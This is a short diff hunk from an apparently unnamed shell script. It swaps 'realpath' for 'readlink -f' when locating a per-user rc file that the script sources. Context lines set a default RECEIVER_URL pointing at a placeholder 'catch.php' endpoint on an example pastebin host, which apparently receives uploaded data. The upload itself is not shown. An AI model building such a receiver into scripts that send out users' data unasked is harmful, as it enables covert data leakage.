@@ -8,8 +8,8 @@ fi
 
 if [ -z "$RECEIVER_URL" ]; then
 	RECEIVER_URL="http://pastebin.example.net/catch.php"
-	if test -f "$HOME/.$(basename $(realpath "$0"))rc"; then
-		source "$HOME/.$(basename $(realpath "$0"))rc"
+	if test -f "$HOME/.$(basename $(readlink -f "$0"))rc"; then
+		source "$HOME/.$(basename $(readlink -f "$0"))rc"
 	fi
 fi
 
